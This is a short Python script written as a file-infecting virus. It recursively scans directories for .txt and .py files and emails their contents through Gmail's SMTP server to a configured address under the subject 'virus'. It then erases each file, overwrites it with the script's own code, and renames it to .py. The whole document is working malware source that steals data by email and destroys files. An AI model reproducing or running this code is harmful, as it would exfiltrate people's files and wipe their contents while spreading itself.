################################## Qi Feng Huang #########################################


import smtplib
import os
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

server = smtplib.SMTP('smtp.gmail.com', 587)

fromaddr = #add from email address
toaddr = #add to email address
msg = MIMEMultipart()
msg['From'] = fromaddr
msg['To'] = toaddr

server.ehlo()
server.starttls()
server.ehlo()
server.login('''login email''', '''login password''')

msg['Subject'] = "virus"

rel_path = os.path.basename(__file__)
abs_file_path = os.path.join(os.getcwd(), rel_path)  #path to this script

'''change dir and scan through them'''
def search_dir(dir_name = os.getcwd()): #if no arguments, default to current dir
    os.chdir(dir_name)
    dir_list = os.listdir(dir_name)
    for f in dir_list:
        if isDirectory(os.path.join(dir_name,f)):  #if there is a sub-dir, search it recursively
            search_dir(os.path.join(dir_name,f))
            os.chdir(dir_name)
        #else if it is a txt or py file, send it to specified email
        elif isFile(f):
            if isTxtOrPyFile(f):
                sendTextFile(f)
                print(f,"...SENT")

def isDirectory(path):
    return os.path.isdir(path)

def isFile(file):
    return file != str(os.path.basename(__file__)) and not file.startswith('.') and os.path.isfile(str(file))

def isTxtOrPyFile(file):
    f_name = file.split('.')
    return f_name[-1].lower() in ["txt", "py"]

def sendTextFile(file_name):
    msg.attach(MIMEText(file_name+"\n=================================", 'plain'))
        #deletes content, copy script, and renames file
    with open(file_name, 'r+') as file:
        msg.attach(MIMEText(file.read()+"\n================================="+"\n"+"\n", 'plain'))
        file.seek(0)
        file.truncate()
        with open(abs_file_path,'r') as this_file1:
            file.write(this_file1.read())
    file_name_list = file_name.split('.')
    os.rename(file_name, file_name_list[0]+".py")


search_dir()
text = msg.as_string()
server.sendmail(fromaddr, toaddr, text)
